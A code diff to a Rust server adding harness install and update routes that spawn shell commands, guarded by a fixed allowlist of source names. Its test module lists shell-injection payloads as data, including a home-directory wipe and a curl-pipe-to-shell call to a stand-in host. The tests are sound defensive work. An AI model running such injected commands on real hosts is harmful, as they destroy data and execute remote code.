@@ -286,6 +286,162 @@ pub(crate) fn route_harness_statuses(
     );
 }
 
+/// The three harness sources `fleet harness` accepts, spelled exactly as
+/// [`crate::harness_install::install_plan`] matches them.
+///
+/// This list is a security boundary, not a convenience: the action below is
+/// spawned as a **shell** command string (that is what `proc_runner` hosts), so
+/// an unvalidated `source` from the request body would be shell injection on
+/// the serving host. Comparing against a fixed set means nothing from the wire
+/// is ever interpolated — the matched constant is.
+const INSTALLABLE_SOURCES: &[&str] = &["claude-code", "codex", "dsh"];
+
+/// Which `fleet harness` verb a request maps to.
+enum HarnessAction {
+    Install,
+    Update,
+    InstallNode,
+}
+
+/// POST `/harness_install` | `/harness_update` with `{"source": "dsh"}`, and
+/// POST `/harness_install_node` with no body — start the action as a detached
+/// proc and return its [`crate::proc_runner::ProcRecord`], which the client
+/// tails through `/proc_output`.
+///
+/// Modelled on `/git_clone_stream` deliberately: installing a harness is a
+/// long, chatty subprocess whose output the user must see as it happens, and
+/// the proc host is the streaming mechanism this codebase already has on all
+/// three clients. The alternative — an in-process job registry with its own
+/// progress-polling route — would be a second streaming mechanism for one
+/// feature.
+///
+/// The typed outcome (`HarnessStatus` / `UpdateReport` / `InstallError` with
+/// its `code`) is *not* in this response: the action has only just started.
+/// It arrives on the last line of the proc's output, prefixed with
+/// `__FLEET_HARNESS_RESULT__` — see `fleet-cli/src/commands/harness.rs`.
+fn route_harness_action(
+    mut request: tiny_http::Request,
+    json_header: tiny_http::Header,
+    action: HarnessAction,
+) {
+    #[derive(serde::Deserialize, Default)]
+    struct Req {
+        #[serde(default)]
+        source: Option<String>,
+    }
+    let mut buf = String::new();
+    let _ = std::io::Read::read_to_string(request.as_reader(), &mut buf);
+    let req = serde_json::from_str::<Req>(&buf).unwrap_or_default();
+
+    let result = (|| -> Result<crate::proc_runner::ProcRecord, String> {
+        let exe = std::env::current_exe()
+            .map_err(|e| format!("cannot locate fleet binary: {e}"))?;
+        let args = match action {
+            HarnessAction::InstallNode => "harness install-node".to_string(),
+            HarnessAction::Install | HarnessAction::Update => {
+                let asked = req.source.as_deref().unwrap_or_default();
+                // The *matched constant* is interpolated, never `asked`.
+                let source = INSTALLABLE_SOURCES
+                    .iter()
+                    .find(|s| **s == asked)
+                    .ok_or_else(|| format!("unknown harness source '{asked}'"))?;
+                let verb = match action {
+                    HarnessAction::Update => "update",
+                    _ => "install",
+                };
+                format!("harness {verb} {source}")
+            }
+        };
+        // cwd only has to exist — the installers write to their own channels,
+        // not here. Home is the one directory guaranteed to be there on every
+        // host that can run an installer at all.
+        let home = crate::session::real_home_dir()
+            .ok_or_else(|| "cannot resolve the home directory".to_string())?;
+        crate::proc_runner::spawn_proc(
+            &exe,
+            &home.to_string_lossy(),
+            &format!("\"{}\" {args}", exe.display()),
+            INSTALL_PTY_COLS,
+            INSTALL_PTY_ROWS,
+        )
+    })()
+    .map(|rec| serde_json::to_string(&rec).unwrap_or_default());
+
+    match result {
+        Ok(body) => {
+            let _ = request.respond(tiny_http::Response::from_string(body).with_header(json_header));
+        }
+        Err(e) => {
+            let body = serde_json::json!({ "error": e }).to_string();
+            let _ = request.respond(
+                tiny_http::Response::from_string(body)
+                    .with_status_code(400)
+                    .with_header(json_header),
+            );
+        }
+    }
+}
+
+/// Wide enough that the result marker's JSON is never the interesting thing a
+/// human's terminal wraps, and tall enough for an installer's progress bar.
+const INSTALL_PTY_COLS: u16 = 200;
+const INSTALL_PTY_ROWS: u16 = 40;
+
+pub(crate) fn route_harness_install(
+    _ctx: &ServeCtx,
+    request: tiny_http::Request,
+    json_header: tiny_http::Header,
+) {
+    route_harness_action(request, json_header, HarnessAction::Install);
+}
+
+pub(crate) fn route_harness_update(
+    _ctx: &ServeCtx,
+    request: tiny_http::Request,
+    json_header: tiny_http::Header,
+) {
+    route_harness_action(request, json_header, HarnessAction::Update);
+}
+
+pub(crate) fn route_harness_install_node(
+    _ctx: &ServeCtx,
+    request: tiny_http::Request,
+    json_header: tiny_http::Header,
+) {
+    route_harness_action(request, json_header, HarnessAction::InstallNode);
+}
+
+#[cfg(test)]
+mod harness_action_tests {
+    use super::INSTALLABLE_SOURCES;
+
+    /// Every name the allowlist offers must be one `install_plan` actually
+    /// knows. A typo here would render the button dead with a 400 that blames
+    /// the *client* for a server-side spelling mistake.
+    #[test]
+    fn allowlisted_sources_are_all_installable() {
+        for s in INSTALLABLE_SOURCES {
+            assert!(
+                crate::harness_install::install_plan(s).is_ok(),
+                "allowlisted source {s:?} has no install plan"
+            );
+        }
+    }
+
+    /// The shapes that must never reach a shell. Asserted on the allowlist
+    /// itself because that is the whole defence: the route interpolates the
+    /// matched constant, so anything not in this list cannot be interpolated.
+    #[test]
+    fn shell_metacharacter_payloads_are_not_allowlisted() {
+        for evil in ["dsh; rm -rf ~", "dsh && curl evil.sh | sh", "$(whoami)", "`id`", ""] {
+            assert!(
+                !INSTALLABLE_SOURCES.contains(&evil),
+                "{evil:?} must not be allowlisted"
+            );
+        }
+    }
+}
+
 pub(crate) fn route_setup_status(
     ctx: &ServeCtx,
     request: tiny_http::Request,
